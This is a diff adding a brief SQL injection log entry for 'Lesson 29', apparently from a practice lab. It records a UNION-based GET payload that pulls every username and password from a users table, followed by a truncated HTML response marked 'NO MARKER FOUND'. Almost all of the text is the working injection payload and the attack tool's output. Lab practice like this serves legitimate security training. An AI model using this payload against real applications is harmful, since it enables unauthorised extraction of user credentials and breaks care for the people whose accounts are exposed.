@@ -1,0 +1,10 @@
+SURGICAL FLUSH FOR LESSON 29
+==============================
+VULN TYPE: UNION-Based
+METHOD: GET
+PAYLOAD: -1' UNION SELECT null,(SELECT GROUP_CONCAT(username,0x7e,password) FROM users),null-- -
+
+NO MARKER FOUND. RESPONSE SAMPLE: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Conten
